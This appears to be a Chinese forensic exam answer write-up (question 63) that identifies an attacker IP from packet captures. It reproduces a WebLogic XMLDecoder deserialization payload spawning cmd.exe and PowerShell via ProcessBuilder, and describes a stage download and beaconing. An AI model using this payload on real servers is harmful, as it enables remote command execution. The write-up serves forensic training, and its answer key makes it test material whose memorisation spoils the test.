# 网络流量分析

请根据流量分析检材，回答以下问题：

#### 63、分析检材，攻击者ip是多少？（答案格式：192.168.1.1）

192.168.111.128

思路：先筛选一下 http 流看看到底发生了什么
流 15718 很明显 128 这个 ip 发送恶意数据包给 80，做了一个 java 反序列化的 rce 动作

![截图](a573a9ea4f45d494547d025915f76ae4.webp)

有过 java web 渗透经验的结合路径`/_async/AsyncResponseService`和这么明显 xml 结构，可以很容易看出来是**WebLogic** 的**XMLDecoder** 反序列化漏洞

```
<work:WorkContext
xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0"><string>cmd.exe</string></void>
<void index="1"><string>/c</string></void>
<void
index="2"><string>powershell.exe ...</string></void>
</array>
<void method="start"/>
</void>
</work:WorkContext>
```

利用**WebLogic** 的 **WorkContext** 在处理 XML 数据时，没有对标签进行严格过滤，使用 **XMLDecoder** 语法`<void class="...">, <array>, <string>` 等会在服务器端被反序列化，实例化一个` java.lang.ProcessBuilder `对象，并调用` .start()` 方法，最终达成一个任意命令执行。这题最后执行的就是 `cmd.exe /c powershell.exe ...`后面 powershell 代码很长，节省时间可以先不具体分析，具体执行了什么可以直接结合下面流量进一步看。
15735 这个包，80 这台 java 服务器被 rce 之后马上反过来向 128 发了一个无意义长路径的 http 请求，响应内容是一个 exe。而后紧接着持续的向一个更诡异的无意义长路径持续发送存活请求（Content-Length: 0），可以很容易判断出来是远程下载了一个 stage 并被成功上线。
